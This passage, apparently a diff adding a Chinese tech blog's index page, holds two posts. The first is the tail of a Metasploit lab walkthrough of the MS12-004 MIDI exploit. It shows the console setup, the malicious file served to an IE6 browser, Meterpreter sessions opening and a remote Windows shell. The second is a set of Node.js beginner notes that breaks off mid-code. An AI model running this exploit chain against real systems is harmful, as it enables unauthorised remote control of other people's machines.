exploit(ms12_004_midi) &gt; <span class="built_in">set</span> SRVHOST 192.168.1.8</div><div class="line">SRVHOST =&gt; 192.168.1.8</div><div class="line"></div><div class="line">msf exploit(ms12_004_midi) &gt; <span class="built_in">set</span> URIPATH /</div><div class="line">URIPATH =&gt; /</div><div class="line">msf exploit(ms12_004_midi) &gt; <span class="built_in">set</span> LPORT 1234</div><div class="line">LPORT =&gt; 1234</div><div class="line">msf exploit(ms12_004_midi) &gt; exploit</div><div class="line">[*] Exploit running as background job.</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.1.8:1234</div><div class="line">[*] Using URL: http://192.168.1.8:8080/</div><div class="line">[*] Server started.</div></pre></td></tr></table></figure>
+<h1 id="使用目标主机IE浏览器打开URL后控制台输出为"><a href="#使用目标主机IE浏览器打开URL后控制台输出为" class="headerlink" title="使用目标主机IE浏览器打开URL后控制台输出为"></a>使用目标主机IE浏览器打开URL后控制台输出为</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">*] 192.168.1.43     ms12_004_midi - Request as: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</div><div class="line">[*] 192.168.1.43     ms12_004_midi - Sending html to 192.168.1.43:2933...</div><div class="line">[*] 192.168.1.43     ms12_004_midi - Request as: Windows-Media-Player/9.00.00.4503</div><div class="line">[*] 192.168.1.43     ms12_004_midi - Sending midi corruption file...</div><div class="line">[*] Sending stage (957487 bytes) to 192.168.1.43</div><div class="line">[*] Meterpreter session 2 opened (192.168.1.8:1234 -&gt; 192.168.1.43:2934) at 2016-06-04 16:38:01 +0800</div><div class="line">[*] Session ID 2 (192.168.1.8:1234 -&gt; 192.168.1.43:2934) processing InitialAutoRunScript <span class="string">'migrate -f'</span></div><div class="line">[*] Current server process: iexplore.exe (372)</div><div class="line">[*] Spawning notepad.exe process to migrate to</div><div class="line">[+] Migrating to 3948</div><div class="line">[+] Successfully migrated to process</div></pre></td></tr></table></figure>
+<h1 id="查看和使用session"><a href="#查看和使用session" class="headerlink" title="查看和使用session"></a>查看和使用session</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">sf exploit(ms12_004_midi) &gt; sessions</div><div class="line"></div><div class="line">Active sessions</div><div class="line">===============</div><div class="line"></div><div class="line">  Id  Type                   Information                                      Connection</div><div class="line">  --  ----                   -----------                                      ----------</div><div class="line">  1   meterpreter x86/win32  DH-CA8822AB9589\Administrator @ DH-CA8822AB9589  192.168.1.8:1234 -&gt; 192.168.1.43:2927 (192.168.1.43)</div><div class="line">  2   meterpreter x86/win32  DH-CA8822AB9589\Administrator @ DH-CA8822AB9589  192.168.1.8:1234 -&gt; 192.168.1.43:2934 (192.168.1.43)</div><div class="line"></div><div class="line">msf exploit(ms12_004_midi) &gt; sessions -i 1</div><div class="line">[*] Starting interaction with 1...</div><div class="line"></div><div class="line">meterpreter &gt; ifconfig</div><div class="line"></div><div class="line">Interface  1</div><div class="line">============</div><div class="line">Name         : MS TCP Loopback interface</div><div class="line">Hardware MAC : 00:00:00:00:00:00</div><div class="line">MTU          : 1520</div><div class="line">IPv4 Address : 127.0.0.1</div><div class="line"></div><div class="line"></div><div class="line">Interface  2</div><div class="line">============</div><div class="line">Name         : AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport</div><div class="line">Hardware MAC : 00:0c:29:84:07:87</div><div class="line">MTU          : 1500</div><div class="line">IPv4 Address : 192.168.1.43</div><div class="line">IPv4 Netmask : 255.255.255.0</div><div class="line"></div><div class="line">meterpreter &gt; shell</div><div class="line">Process 204 created.</div><div class="line">Channel 1 created.</div><div class="line">Microsoft Windows XP [Version 5.1.2600]</div><div class="line">(C) Copyright 1985-2001 Microsoft Corp.</div><div class="line"></div><div class="line">C:\Documents and Settings\Administrator\Desktop&gt;</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Metasploit</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/sec/Metasploit-MIDI文件解析远程代码执行/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-Node-js学习笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/others/Node-js学习笔记/">Node.js学习笔记</a>
+    </h1>
+  
+
+        
+        <a href="/others/Node-js学习笔记/" class="archive-article-date">
+  	<time datetime="2016-06-03T14:00:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-06-03</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="新建http服务"><a href="#新建http服务" class="headerlink" title="新建http服务"></a>新建http服务</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"></div><div class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>)  </span>&#123;</div><div class="line">    response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span>&#125;);</div><div class="line">    <span class="keyword">if</span>(request.url!==<span class="string">"/favicon.ico"</span>)&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'访问'</span>);</div><div class="line">        response.write(<span class="string">'hello,world'</span>);</div><div class="line">        response.end(<span class="string">"response.end"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;).listen(<span class="number">8000</span>);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Server running at http://127.0.0.1:8000/"</span>);</div></pre></td></tr></table></figure>
+<h1 id="使用function"><a href="#使用function" class="headerlink" title="使用function"></a>使用function</h1><blockquote>
+<p>目录结构</p>
+<p>tp@V:/mnt/d/Node.js$ tree<br>.<br>├── hello.js<br>├── models<br>│   └── otherfuns.js<br>└── n2_funcall.js<br>n2_funcall.js</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"><span class="keyword">var</span> otherfun = <span class="built_in">require</span>(<span class="string">"./models/otherfuns.js"</span>);</div><div class="line"></div><div class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>)</span>&#123;</div><div class="line">		response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span>&#125;);</div><div class="line">	<span class="keyword">if</span>(request.url!==<span class="string">"/favicon.ico"</span>)&#123;</div><div class="line">		otherfun[<span class="string">'fun3'</span>](response);</div><div class="line">		otherfun[<span class="string">'fun2'</span>](response);<span class="comment">//也可以用otherfun.fun2(response)</span></div><div class="line">		response.end(<span class="string">"response.end"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;).listen(<span class="number">8000</span>);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Server running at http://127.0.0.1:8000/"</span>);</div></pre></td></tr></table></figure>
+<blockquote>
+<p>otherfuns.js</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports=&#123;</div><div class="line">	<span class="attr">fun2</span>:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">"我是fun2"</span>);</div><div class="line">		res.write(<span class="string">"Hello, I am fun2"</span>);</div><div class="line">	&#125;,</div><div class="line">	<span class="attr">fun3</span>:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">"I am fun3"</span>);</div><div class="line">		res.write(<span class="string">"Hello, I am fun3"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>效果</p>
+</blockquote>
+<p><img src="https://ww2.sinaimg.cn/large/006tNc79gy1fdtdapfssuj30cw061dfw.jpg" alt=""></p>
+<h1 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h1><blockquote>
+<p>models/User.js</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">User</span>(<span class="params">id, name, age</span>)</span>&#123;</div><div class="line">	<span class="keyword">this</span>.id=id;</div><div class="line">	<span class="keyword">this</span>.name=name;</div><div class="line">	<span class="keyword">this</span>.age=age;</div><div class="line">	<span class="keyword">this</span>.enter=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">		<span class="built_in">console</span>.log(<span class="keyword">this</span>.name+<span class="string">"进入图书馆"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="built_in">module</span>.exports = User;</div></pre></td></tr></table></figure>
+<blockquote>
+<blockquote>
+<p>models/Teacher.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> User = <span class="built_in">require</span>(<span class="string">'./User'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Teacher</span>(<span class="params">id,name,age</span>)</span>&#123;</div><div class="line">	User.apply(<span class="keyword">this</span>,[id,name,age]);</div><div class="line">	<span class="keyword">this</span>.teach=<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</div><div class="line">		res.write(<span class="keyword">this</span>.name+<span class="string">"讲课"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="built_in">module</span>.exports = Teacher;</div><div class="line"><span class="string">``</span><span class="string">`JavaScript</span></div><div class="line">&gt;n3_modelcall.js</div></pre></td></tr></table></figure></p>
+</blockquote>
+</blockquote>
+<p>var http = require(‘http’);</p>
+<p>// var User = require(“./models/User”);<br>var Teacher = require(“./models/Teacher”)</p>
+<p>http.createServer(function (request, response){<br>    response.writeHead(200, {‘Content-Type’: ‘text/html; charset=utf-8’});<br>    if(request.url!==”/favicon.ico”){<br>        //funname = ‘fun3’;<br>        teacher = new Teacher(1,’我来’,18);<br>        // user.id =1;<br>        // user.name=’我来’;<br>        // user.age=18;<br>        teacher.enter();<br>        teacher.teach(response);<br>        response.end(“response.end”);<br>    }</p>
+<p>}).listen(8000);<br>console.log(“Server running at <a href="http://127.0.0.1:8000/" target="_blank" rel="external">http://127.0.0.1:8000/</a>“);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">![](https://ww2.sinaimg.cn/large/006tNc79gy1fdtdb7fgu8j30b8058gln.jpg)</div><div class="line"></div><div class="line"># 使用路由</div><div class="line">&gt;models/route.js</div><div class="line">```JavaScript</div><div class="line">module.exports=&#123;</div><div class="line">	login:function(req, res)&#123;</div><div class="line">		res.write(&quot;I am login module.&quot;);</div><div class="line">	&#125;,</div><div class="line">	admin:function(req, res)&#123;</div><div class="line">		res.write(&quot;I am admin module.&quot;);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>n4_rout.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> router = <span class="built_in">require</span>(<span class="string">'./models/route'</span>);</div><div class="line"></div><div class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>)</span>&#123;</div><div class="line">	response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span>&#125;);</div><div class="line">	<span class="keyword">if</span>(request.url!==<span class="string">"/favicon.ico"</span>)&#123;</div><div class="line">		<span class="keyword">var</span> pathname = url.parse(request.url).pathname;</div><div class="line">		pathname = pathname.replace(<span class="regexp">/\//</span>, <span class="string">''</span>);</div><div class="line">		<span class="built_in">console</span>.log(pathname);</div><div class="line">		router[pathname](request, response);</div><div class="line">		response.end(<span class="string">"response.end"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;).listen(<span class="number">8000</span>);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Server running at http://127.0.0.1:8000/"</span>);</div></pre></td></tr></table></figure></p>
+</blockquote>
+<p><img src="https://ww2.sinaimg.cn/large/006tNc79gy1fdtdd3yrcwj30b8058gln.jpg" alt=""></p>
+<h1 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h1><blockquote>
+<p>models/route.js</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> optfile = <span class="built_in">require</span>(<span class="string">'./optfile'</span>);</div><div class="line"><span class="built_in">module</span>.exports=&#123;</div><div class="line">	<span class="attr">login</span>:<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">recall</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">			res.write(data);</div><div class="line">			res.end(<span class="string">" "</span>);</div><div class="line">		&#125;</div><div class="line">		optfile.readfile(<span class="string">'./views/login.html'</span>, recall);</div><div class="line">	&#125;,</div><div class="line">	<span class="attr">admin</span>:<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">recall</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">			res.write(data);</div><div class="line">			res.end(<span class="string">" "</span>);</div><div class="line">		&#125;</div><div class="line">		optfile.readfile(<span class="string">'./views/admin.html'</span>, recall);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>models/optfile.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">	<span class="attr">readfileSync</span>:<span class="function"><span class="keyword">function</span>(<span class="params">path</span>)</span>&#123;<span class="comment">//同步读取</span></div><div class="line">		<span class="keyword">var</span> data = fs.readFileSync(path, <span class="string">'utf-8'</span>);</div><div class="line">		<span class="built_in">console</span>.log(data);</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">'同步方法执行完毕'</span>);</div><div class="line">	&#125;,</div><div class="line">	<span class="attr">readfile</span>:<span class="function"><span class="keyword">function</span>(<span class="params">path, recall</span>)</span>&#123;<span class="comment">//异步读取</span></div><div class="line">		fs.readFile(path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</div><div class="line">			<span class="keyword">if</span>(err)&#123;</div><div class="line">				<span class="built_in">console</span>.log(err);</div><div class="line">		&#125;<span class="keyword">else</span>&#123;</div><div class="line">			<span class="built_in">console</span>.log(data.toString());</div><div class="line">			recall(data);</div><div class="line">		&#125;</div><div class="line">	&#125;);</div><div class="line">	<span class="built_in">console</span>.log(<span class="string">'异步方法执行完毕'</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>n5_readfile.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"><span class="keyword">var</span> router = <span class="built_in">require</span>(<span class="string">'./models/route'</span>);</div><div class="line"></div><div class="line"><span class="comment">//var optfile = require('./models/optfile');</span></div><div class="line"></div><div class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>)</span>&#123;</div><div class="line">	response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span>&#125;);</div><div class="line">	<span class="keyword">if</span>(request.url!==<span class="string">"/favicon.ico"</span>)&#123;</div><div class="line">		<span class="keyword">var</span> pathname = url.parse(request.url).pathname;</div><div class="line">		pathname = pathname.replace(<span class="regexp">/\//</span>, <span class="string">''</span>);</div><div class="line">		<span class="built_in">console</span>.log(pathname);</div><div class="line">		router[pathname](request, response);</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;).listen(<span class="number">8000</span>);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Server running at http://127.0.0.1:8000/"</span>);</div></pre></td></tr></table></figure></p>
+<p>views/login.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">This is login page.</div></pre></td></tr></table></figure></p>
+<p>views/admin.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">This is admin page.</div></pre></td></tr></table></figure></p>
+</blockquote>
+<p><img src="https://ww2.sinaimg.cn/large/006tNc79gy1fdtdbleg2tj30pz082jrt.jpg" alt="读文件"></p>
+<h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><blockquote>
+<p>models/optfile.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">	<span class="attr">writefile</span>:<span class="function"><span class="keyword">function</span>(<span class="params">path, data, recall</span>)</span>&#123;<span class="comment">//异步方式</span></div><div class="line">		fs.writeFile(path, data, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</div><div class="line">			<span class="keyword">if</span> (err)&#123;</div><div class="line">				<span class="keyword">throw</span> err;</div><div class="line">			&#125;</div><div class="line">			<span class="built_in">console</span>.log(<span class="string">'It\'s Saved!'</span>);<span class="comment">//文件被保存</span></div><div class="line">			recall(<span class="string">"write file success."</span>);</div><div class="line">		&#125;);</div><div class="line">	&#125;,</div><div class="line">	<span class="attr">writeFileSync</span>:<span class="function"><span class="keyword">function</span>(<span class="params">path, data</span>)</span>&#123;<span class="comment">//同步方式</span></div><div class="line">		fs.writeFileSync(path, data);</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">"同步写文件完成"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>models/route.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> optfile = <span class="built_in">require</span>(<span class="string">'./optfile'</span>);</div><div class="line"><span class="built_in">module</span>.exports=&#123;</div><div class="line">	<span class="attr">login</span>:<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">recall</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">			res.write(data);</div><div class="line">			res.end(<span class="string">" "</span>);</div><div class="line">		&#125;</div><div class="line">		optfile.readfile(<span class="string">'./views/login.html'</span>, recall);</div><div class="line">	&#125;,</div><div class="line">	<span class="attr">admin</span>:<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">recall</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">			res.write(data);</div><div class="line">			res.end(<span class="string">" "</span>);</div><div class="line">		&#125;</div><div class="line">		optfile.readfile(<span class="string">'./views/admin.html'</span>, recall);</div><div class="line">	&#125;,</div><div class="line">	<span class="attr">writefile</span>:<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">recall</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">			res.write(data);</div><div class="line">			res.end(<span class="string">" "</span>);</div><div class="line">		&#125;</div><div class="line">		optfile.writefile(<span class="string">'./views/test.txt'</span>, <span class="string">'write file ok1.'</span>, recall);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>n6_writefile.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"><span class="keyword">var</span> router = <span class="built_in">require</span>(<span class="string">'./models/route'</span>);</div><div class="line"></div><div class="line"><span class="comment">//var optfile = require('./models/optfile');</span></div><div class="line"></div><div class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>)</span>&#123;</div><div class="line">	response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span>&#125;);</div><div class="line">	<span class="keyword">if</span>(request.url!==<span class="string">"/favicon.ico"</span>)&#123;</div><div class="line">		<span class="keyword">var</span> pathname = url.parse(request.url).pathname;</div><div class="line">		pathname = pathname.replace(<span class="regexp">/\//</span>, <span class="string">''</span>);</div><div class="line">		<span class="built_in">console</span>.log(pathname);</div><div class="line">		router[pathname](request, response);</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;).listen(<span class="number">8000</span>);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Server running at http://127.0.0.1:8000/"</span>);</div></pre></td></tr></table></figure></p>
+</blockquote>
+<p><img src="https://ww1.sinaimg.cn/large/006tNc79gy1fdtddiqzcwj30sy0740ss.jpg" alt="写文件"></p>
+<h1 id="读取图片"><a href="#读取图片" class="headerlink" title="读取图片"></a>读取图片</h1><blockquote>
+<p>models/optfile.js<br>仅能显示图片<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">	<span class="attr">readImg</span>:<span class="function"><span class="keyword">function</span>(<span class="params">path, res</span>)</span>&#123;</div><div class="line">		fs.readFile(path, <span class="string">'binary'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, file</span>)</span>&#123;</div><div class="line">			<span class="keyword">if</span> (err)&#123;</div><div class="line">				<span class="built_in">console</span>.log(err);</div><div class="line">				<span class="keyword">return</span>;</div><div class="line">			&#125;<span class="keyword">else</span>&#123;</div><div class="line">				<span class="built_in">console</span>.log(<span class="string">'输出文件'</span>);</div><div class="line">				res.write(file, <span class="string">'binary'</span>);</div><div class="line">				res.end();</div><div class="line">			&#125;</div><div class="line">		&#125;);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>n7_readimg.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> optfile = <span class="built_in">require</span>(<span class="string">'./models/optfile'</span>);</div><div class="line"></div><div class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>)</span>&#123;</div><div class="line">	response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'image/jpeg'</span>&#125;);</div><div class="line">	<span class="keyword">if</span>(request.url!==<span class="string">"/favicon.ico"</span>)&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'访问'</span>);</div><div class="line">    optfile.readImg(<span 